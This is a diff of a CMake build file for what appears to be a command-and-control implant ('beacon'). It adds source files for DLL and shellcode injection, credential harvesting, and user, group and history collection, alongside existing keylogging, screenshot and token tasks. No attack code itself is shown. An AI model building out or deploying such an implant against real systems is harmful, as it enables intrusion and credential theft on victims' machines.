@@ -49,14 +49,22 @@ if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
             src/core/system/arch.cpp
             src/core/system/env.cpp
             src/core/system/fs.cpp
+            src/core/system/group.cpp
             src/core/system/http.cpp
             src/core/system/priv.cpp
             src/core/system/process.cpp
+            src/core/system/user.cpp
+            src/core/technique/injection/dll_injection.cpp
+            src/core/technique/injection/shellcode_injection.cpp
             src/core/tasks/cat.cpp
             src/core/tasks/cd.cpp
             src/core/tasks/cp.cpp
+            src/core/tasks/creds.cpp
+            src/core/tasks/dll.cpp
             src/core/tasks/download.cpp
             src/core/tasks/execute.cpp
+            src/core/tasks/group.cpp
+            src/core/tasks/history.cpp
             src/core/tasks/ip.cpp
             src/core/tasks/keylog.cpp
             src/core/tasks/kill.cpp
@@ -72,9 +80,11 @@ if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
             src/core/tasks/rm.cpp
             src/core/tasks/rmdir.cpp
             src/core/tasks/screenshot.cpp
+            src/core/tasks/shellcode.cpp
             src/core/tasks/sleep.cpp
             src/core/tasks/token.cpp
             src/core/tasks/upload.cpp
+            src/core/tasks/user.cpp
             src/core/tasks/whoami.cpp
             src/core/utils/convert.cpp
             src/core/utils/split.cpp
@@ -83,8 +93,8 @@ if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
 endif()
 
 # LINK LIBRATILIES
-# link_libraries(netapi32 wtsapi32 mscoree mscorlib)
-link_libraries(dbghelp gdi32 gdiplus iphlpapi ntdll psapi shlwapi winhttp wsock32 ws2_32)
+# link_libraries(wtsapi32 mscoree mscorlib)
+link_libraries(dbghelp gdi32 gdiplus iphlpapi netapi32 ntdll psapi shlwapi winhttp wsock32 ws2_32)
 
 # ADD
 if(${PAYLOAD_FORMAT} STREQUAL "dll")
